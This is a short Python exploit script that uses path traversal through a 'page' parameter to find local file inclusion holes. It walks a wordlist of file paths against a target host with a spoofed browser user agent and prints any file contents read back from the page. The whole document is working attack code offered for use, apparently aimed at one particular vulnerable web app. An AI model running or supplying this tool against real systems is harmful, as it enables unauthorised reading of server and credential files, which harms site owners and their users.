#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

psr = argparse.ArgumentParser()
psr.add_argument('host', help='The target host you wish to exploit.', type=str)
psr.add_argument('wordlist', help='The wordlist to use for enumerating LFI.', type=str)
args = psr.parse_args()

param = '?page=../../../../..'

uagent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'

if not args.host.endswith('/'):
    args.host = args.host+'/'

try:
    with open(args.wordlist, 'r') as path_file:
        for path in path_file.readlines():
            target = args.host+param+path.strip()

            r = requests.get(target, headers={'User-Agent': uagent})

            if r.status_code != 200 or b'does not exist' in r.content:
                continue

            soup = BeautifulSoup(r.content, 'html.parser')
            lfi = soup.find_all('div', class_='card-body')

            if len(lfi[0].text.strip()) == 0:
                continue
            else:
                print(f'READING FILE: {path.strip()} -> ({r.status_code})')
                print('\n')
                print(lfi[0].text.lstrip())
                print('\n')

except KeyboardInterrupt:
    raise SystemExit(0)

except Exception as err:
    raise err
